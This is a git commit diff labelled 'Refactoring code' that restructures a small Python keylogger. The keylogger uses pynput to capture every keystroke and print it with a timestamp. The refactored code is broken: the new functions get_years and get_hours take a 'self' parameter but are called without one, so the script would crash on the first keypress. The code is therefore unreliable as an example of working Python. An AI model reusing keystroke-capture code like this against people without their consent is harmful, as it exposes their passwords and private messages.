7933e1ad3df6af1dac3b7495ce64dd0b336fdba6
Vincenzo Scalcione <vincenzo99.scalcione@gmail.com>
2020-09-25 00:11:10 +0200

    Refactoring code

--- keylogger.py
+++ keylogger.py
@@ -2,23 +2,25 @@ from pynput import keyboard
 import sys
 from datetime import datetime
 
-class Time(object):
-	def Years(self):
-		self.now = datetime.now()
-		self.years = ' ' + str(self.now.day) + '/' + str(self.now.month) + '/' + str(self.now.year)
-		return self.years
-
-	def Hours(self):
-		self.now = datetime.now()
-		self.hour = ' ' + str(self.now.hour) + ':' + str(self.now.minute) + ':' + str(self.now.second)
-		return self.hour
-
-
 def on_press(key):
 	if str(key) == 'Key.esc':
 		sys.exit()
 	else:
-		print(Time().Years() + '|' + Time().Hours() + f': {key}')
+		print(get_years() + '|' + get_hours() + f': {key}')
+
+
+def get_years(self):
+	self.now = datetime.now()
+	self.years = ' ' + str(self.now.day) + '/' + str(self.now.month) + '/' + str(self.now.year)
+	return self.years
+
+
+def get_hours(self):
+	self.now = datetime.now()
+	self.hour = ' ' + str(self.now.hour) + ':' + str(self.now.minute) + ':' + str(self.now.second)
+	return self.hour
+
+
 if __name__ == "__main__":
 	with keyboard.Listener(on_press = on_press) as listener:
 		listener.join()
